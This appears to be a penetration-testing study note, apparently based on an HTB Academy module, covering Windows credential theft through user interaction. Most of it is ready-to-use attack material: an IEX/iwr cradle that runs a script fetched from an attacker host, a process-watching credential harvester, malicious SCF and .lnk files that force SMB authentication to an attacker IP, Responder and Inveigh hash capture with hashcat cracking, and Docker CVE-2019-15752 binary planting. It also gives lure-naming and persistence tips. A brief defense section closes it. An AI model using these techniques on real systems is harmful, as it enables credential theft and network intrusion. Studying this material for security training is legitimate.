# Interacting with Users

## 🎯 Overview

**User interaction attacks** exploit the human element as the weakest link in security. These techniques target **unsuspecting users** through **network traffic capture**, **malicious file placement**, and **credential harvesting** when technical privilege escalation methods are exhausted. Focus on **heavily accessed file shares** and **network monitoring** for credential theft opportunities.

## 📡 Traffic Capture Techniques

### Wireshark Privilege Exploitation
```cmd
# Wireshark vulnerability:
- Npcap driver access NOT restricted to Administrators by default
- Unprivileged users can capture network traffic
- Potential for cleartext credential capture

# Installation check:
- Look for Wireshark in Program Files
- Check if "Restrict driver's access to Administrators" is unchecked
```

### Network Traffic Monitoring
```bash
# On attack machine - passive traffic capture:
tcpdump -i <interface> -w capture.pcap

# Using net-creds for credential extraction:
net-creds -i <interface>           # Live interface monitoring
net-creds -p capture.pcap          # PCAP file analysis

# Let tools run in background during assessment
```

### Example Credential Capture
```cmd
# Wireshark FTP capture example:
Source: 10.129.43.8 → Destination: 10.129.43.7
Protocol: FTP

220-FileZilla Server
USER root
PASS FTP_adm1n!

# Result: Cleartext FTP credentials captured
```

## 🔍 Process Command Line Monitoring

### PowerShell Process Monitor
```powershell
# Monitor for credentials in command lines:
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

### Remote Script Execution
```powershell
# Host script on attack machine and execute remotely:
IEX (iwr 'http://10.10.10.205/procmon.ps1')

# Example captured command:
net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd

# Result: Domain service account credentials revealed
```

### Target Processes
```cmd
# Look for processes containing:
- net use commands with /user: parameter
- Database connection strings
- Service account authentications
- Scheduled task executions with credentials
- Backup operations with stored passwords
```

## 🗂️ Vulnerable Services Exploitation

### Docker Desktop CVE-2019-15752
```cmd
# Vulnerability details:
- Affects Docker Desktop Community Edition before 2.1.0.1
- Misconfigured directory: C:\PROGRAMDATA\DockerDesktop\version-bin\
- BUILTIN\Users group has full write access
- Missing files: docker-credential-wincred.exe, docker-credential-wincred.bat

# Exploitation:
1. Check Docker version: docker --version
2. Verify directory permissions: icacls C:\PROGRAMDATA\DockerDesktop\version-bin\
3. Place malicious executable in directory
4. Wait for Docker restart or 'docker login' command
```

### Service Enumeration Strategy
```cmd
# Look for vulnerable service versions:
- Docker Desktop < 2.1.0.1
- Other applications with writable directories
- Services running with elevated privileges
- Applications with predictable file searches
```

## 📁 SCF File Hash Capture

### Shell Command File (SCF) Attack
```cmd
# SCF file purpose:
- Used by Windows Explorer for navigation
- Can be manipulated to point to UNC paths
- Triggers SMB authentication when folder is accessed
```

### Malicious SCF Creation
```ini
# Create @Inventory.scf (@ for top of directory listing):
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop

# File placement strategy:
- Use @ prefix for top positioning
- Name similar to existing files
- Place in heavily accessed shares
```

### Responder Hash Capture
```bash
# Start Responder for NTLM capture:
sudo responder -wrf -v -I tun0

# Example captured hash:
[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator  
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...

# Wait 2-5 minutes for user to browse the share
```

### Hash Cracking
```bash
# Crack NTLMv2 hash with Hashcat:
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

# Example result:
ADMINISTRATOR::WINLPE-SRV01:815c504e7b06ebda:...:Welcome1

# Mode 5600 = NetNTLMv2
```

## 🔗 Malicious .lnk File Attacks

### .lnk vs SCF Compatibility
```cmd
# SCF limitations:
- No longer works on Server 2019
- Legacy technique for older systems

# .lnk advantages:
- Works on modern Windows versions
- More reliable hash capture
- Flexible targeting options
```

### PowerShell .lnk Generation
```powershell
# Create malicious .lnk file:
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### .lnk File Properties
```cmd
# Key properties for stealth:
TargetPath:     \\<attacker_ip>\@<fake_file>
IconLocation:   %windir%\system32\shell32.dll, 3
WindowStyle:    1 (hidden)
Description:    Legitimate-looking description
HotKey:         Optional keyboard shortcut

# Naming strategy:
- Use legitimate-sounding names
- Match existing file naming patterns
- Consider file extensions (.pdf.lnk, .doc.lnk)
```

## 🎯 File Share Attack Strategy

### Target Selection
```cmd
# High-value file share targets:
- Network drives (mapped drives)
- Shared project folders
- Document repositories  
- Backup locations
- User desktop/documents folders
- Software deployment shares
```

### File Placement Strategy
```cmd
# Optimal placement:
1. Recently accessed directories
2. Folders with regular user traffic
3. Shared drives with multiple users
4. Directories with existing files (blend in)
5. Desktop folders of high-privilege users
```

### Naming Conventions
```cmd
# Effective file names:
@Inventory.scf          # @ for top listing
@Updates.lnk           # System-related names
@Security_Policy.lnk   # Official-sounding documents
@Quarterly_Report.lnk  # Business documents
@IT_Notice.scf         # IT department files
```

## 🔧 Alternative Hash Capture Tools

### Responder Alternatives
```bash
# Inveigh (PowerShell-based):
Import-Module Inveigh.ps1
Invoke-Inveigh -ConsoleOutput Y -LLMNR Y -NBT Y -mDNS Y

# InveighZero (.NET version):
.\InveighZero.exe

# All tools capture NTLM hashes from SMB authentication
```

### Tool Comparison
```cmd
# Responder:    # Python-based, Linux preferred
# Inveigh:      # PowerShell, Windows native
# InveighZero:  # .NET compiled, Windows portable
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
```cmd
# Access: RDP to target with htb-student:HTB_@cademy_stdnt!
# Objective: Obtain cleartext credentials for SCCM_SVC user
```

### SCCM_SVC Credential Extraction
```cmd
# Method 1: Process monitoring for scheduled tasks
# SCCM often runs scheduled tasks with service accounts

# Method 2: SCF/LNK file placement in SCCM-related shares
# SCCM shares are frequently accessed by administrators

# Method 3: Traffic capture during SCCM operations
# SCCM communications may contain credentials

# Method 4: File share enumeration for SCCM config files
# SCCM configuration files may contain service account info
```

### Practical Approach
```powershell
# 1. Start process monitoring:
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 2
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

# 2. Place malicious files in accessible shares:
# Create @SCCM_Update.lnk pointing to attacker SMB

# 3. Start Responder on attack machine:
sudo responder -wrf -v -I tun0

# 4. Wait for SCCM service account authentication
```

## 🔄 Advanced User Interaction Techniques

### Multi-Vector Approach
```cmd
# Comprehensive strategy:
1. Network traffic monitoring (passive)
2. Process command line monitoring (active)
3. Malicious file placement (social engineering)
4. Service vulnerability exploitation (technical)
5. Hash capture and cracking (post-exploitation)
```

### Persistence Considerations
```cmd
# Long-term assessment tactics:
- Plant multiple malicious files across shares
- Monitor for extended periods (days/weeks)
- Target different user groups
- Use various file types (.scf, .lnk, .url)
- Rotate attack infrastructure
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Unusual .scf/.lnk file creation in shares
- SMB authentication to external IPs
- Wireshark/packet capture tool usage
- Process monitoring script execution
- Responder/Inveigh tool signatures
- Abnormal file access patterns
```

### Defensive Measures
```cmd
# Security recommendations:
- Restrict Npcap driver to Administrators only
- Monitor file share access patterns
- Block SMB to external networks
- Implement file type restrictions on shares
- Regular security awareness training
- Network segmentation
- NTLM authentication monitoring
- Endpoint detection for credential capture tools
```

## 💡 Key Takeaways

1. **Users are often the weakest link** in security chains
2. **Network traffic monitoring** can reveal cleartext credentials
3. **Process command lines** frequently contain embedded passwords
4. **SCF files** trigger automatic SMB authentication (legacy systems)
5. **Malicious .lnk files** work on modern Windows versions
6. **File share placement** strategy is critical for success
7. **Hash capture + offline cracking** provides reliable credential theft
8. **Multiple attack vectors** increase success probability

---

*User interaction attacks exploit human behavior and system trust relationships to capture credentials when technical privilege escalation methods are insufficient.* 